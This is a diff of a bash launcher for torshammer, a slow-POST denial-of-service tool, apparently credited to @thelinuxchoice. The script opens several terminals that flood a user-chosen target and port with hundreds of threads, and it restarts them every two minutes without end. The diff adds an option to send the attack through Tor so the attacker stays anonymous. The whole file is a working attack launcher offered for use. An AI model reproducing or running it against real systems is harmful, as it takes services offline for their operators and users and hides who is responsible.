@@ -1,4 +1,5 @@
 #!/bin/bash
+# ig: @thelinuxchoice
 trap 'printf "\e[1;77m Ctrl+c was pressed, exiting...\e[0m"; killall python; exit 0' 2
 checkroot() {
 if [[ "$(id -u)" -ne 0 ]]; then
@@ -20,21 +21,36 @@ read -p "Threads: (Default 600): " threads
 threads="${threads:-${default_threads}}"
 read -p "Terminals (Default 4): " inst
 inst="${inst:-${default_inst}}"
-read -p "Anonymized via Tor? (start tor before) [y/n]: " tor
+read -e -p "Anonymized via Tor? (start tor before) [Y/n]: " tor
 printf "\e[0m"
 tor="${tor:-${default_tor}}"
-if [[ $tor == "y" ]]; then
-eval $tor="-T"
+if [[ $tor == "y" || $tor == "Y" ]]; then
+printf "\e[1;32m Press Ctrl + C to stop attack \e[0m \n"
+attack_tor
 else
-eval $tor=""
+printf "\e[1;32m Press Ctrl + C to stop attack \e[0m \n"
+attack
 fi
 }
+attack_tor() {
+i=1
+while true; do
+  let i=1
+  while [ $i -le $inst ]; do
+gnome-terminal --tab -- python torshammer/torshammer.py -t $target -p $port -r $threads -T
+i=$((i+1))
+done
+sleep 120
+killall python
+done
+}
+
 attack() {
 i=1
 while true; do
   let i=1
   while [ $i -le $inst ]; do
-gnome-terminal --tab -- python torshammer/torshammer.py -t $target -p $port -r $threads $tor
+gnome-terminal --tab -- python torshammer/torshammer.py -t $target -p $port -r $threads
 i=$((i+1))
 done
 sleep 120
@@ -53,6 +69,6 @@ printf "\e[1;77m DoS testing tool \e[0m \n\n"
 banner
 checkroot
 config
-printf "\e[1;32m Press Ctrl + C to stop attack \e[0m \n"
-attack
+#printf "\e[1;32m Press Ctrl + C to stop attack \e[0m \n"
+#attack
 
